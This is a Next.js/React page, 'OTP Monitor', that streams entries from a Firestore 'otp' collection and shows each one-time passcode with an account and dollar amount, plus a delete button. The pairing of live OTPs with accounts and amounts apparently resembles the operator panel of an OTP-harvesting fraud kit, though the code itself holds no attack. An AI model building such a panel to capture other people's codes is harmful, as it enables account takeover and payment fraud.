"use client";

import { useEffect, useState } from "react";
import { collection, onSnapshot, query, orderBy, deleteDoc, doc } from "firebase/firestore";
import { db } from "@/lib/firebaseClient";
import { motion } from "framer-motion";

export default function OtpAdminPage() {
  const [otps, setOtps] = useState([]);

  useEffect(() => {
    const q = query(
      collection(db, "otp"),
      orderBy("createdAt", "desc") // 🔥 newest first
    );

    const unsub = onSnapshot(q, (snap) => {
      setOtps(
        snap.docs.map((d) => ({
          id: d.id,
          ...d.data(),
        }))
      );
    });

    return unsub;
  }, []);

  const handleDelete = async (id) => {
    if (!confirm("Delete this OTP?")) return;
    await deleteDoc(doc(db, "otp", id));
  };

  return (
  
      < motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="min-h-screen bg-slate-950 text-white ">
        <h1 className="text-xl font-semibold mb-3 text-white text-center">OTP Monitor</h1>

        <div >
          {otps.length === 0 && (
            <p className="text-slate-400">No OTPs yet.</p>
          )}

          {otps.map((o) => (
            <div
              key={o.id}
              className="bg-slate-900 p-4  border-t border-slate-800 flex justify-between items-start gap-4"
            >
              <div className="space-y-1 text-sm">
                <p><b>OTP:</b> {o.code}</p>
                <p><b>Account:</b> {o.account}</p>
                <p><b>Amount:</b> ${o.amount}</p>

                <p className="text-xs text-slate-400">
                  <b>Received:</b>{" "}
                  {o.createdAt?.toDate
                    ? o.createdAt.toDate().toLocaleString()
                    : "—"}
                </p>
              </div>

              <button
                onClick={() => handleDelete(o.id)}
                className="text-red-400 hover:text-white hover:bg-red-600 transition text-sm border border-red-500/40 px-3 py-1 rounded"
              >
                Delete
              </button>
            </div>
          ))}
        </div>
      </motion.div>
    
  );
}
